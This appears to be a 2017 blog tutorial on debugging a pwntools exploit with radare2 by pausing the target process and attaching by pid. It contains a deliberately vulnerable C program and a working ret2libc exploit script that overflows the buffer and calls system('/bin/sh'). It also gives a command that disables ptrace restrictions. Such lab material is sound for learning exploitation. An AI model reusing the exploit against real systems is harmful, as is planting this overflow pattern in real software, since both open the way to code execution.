---
title: Debugging binaries using Pwntools and Radare2
date: 2017-08-04
categories: [Exploitation]
tags: ['Radare2', 'Pwntools', 'Debug']
image:
    path: "unsorted/r-2-logo.png"
---

[Pwntools](https://github.com/Gallopsled/pwntools/tree/stable)
is a cool and useful framework/library for writing exploits.

It comes with an handy [built-in method](https://docs.pwntools.com/en/stable/gdb.html)
for launching a gdb instance and attaching the target process to it. But, what
if we would like to debug the binary we are exploiting with another debugger?
That's actually very easy.


Lets take as example this simple ret2libc-vulnerable program:

```console
$ cat retlibcme.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char** argv){
    char buf[10];
    printf("system: %p, buf: %p\n",system,buf);
    fgets(buf,100, stdin);
    return 0;
}

$ gcc -m32 -fno-stack-protector retlibcme.c -o retlibcme
```


Once we made our exploit, just add a call to the method
`util.proc.wait_for_debugger` with the pid of the process:

```python
from pwn import *

# Run process
context.arch = 'i386'
r = process(['/home/luigi/retlibcme'])

# Wait for debugger
pid = util.proc.pidof(r)[0]
print "The pid is: "+str(pid)
util.proc.wait_for_debugger(pid)

# Get the leaks and build the payload
leak = r.recvuntil('\n')
system = int(leak[8:17], 16)
buf = int(leak[24:34], 16)

payload = 'AAAAAAAAAAAAAAAAAAAAAA'
payload += pack(system)
payload += 'AAAA'             # ret address after system (who cares...)
payload += pack(buf + len(payload) + 4)
payload += '/bin/sh\0'

# Exploit
r.sendline(payload)
r.interactive()
```

Now, just run radare2 in another terminal and attach to the 
process using the pid. We can also ask radare2 to run some
commands directly starting using the `-c` option.

```console
$ r2 -d 7376 -c 'dbt $$'
PIDPATH: /home/werew/retlibcme
= attach 7376 7376
bin.baddr 0x08048000
Using 0x8048000
Assuming filepath /home/werew/retlibcme
asm.bits 32
 -- Set 'e bin.dbginfo=true' to load debug information at startup.
[0xf7746440]>
```

**NB:** If you are using ubuntu, be aware of [this](https://askubuntu.com/questions/41629/after-upgrade-gdb-wont-attach-to-process). So just `sudo` radare2 or disable the ptrace limitations by running   
`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`

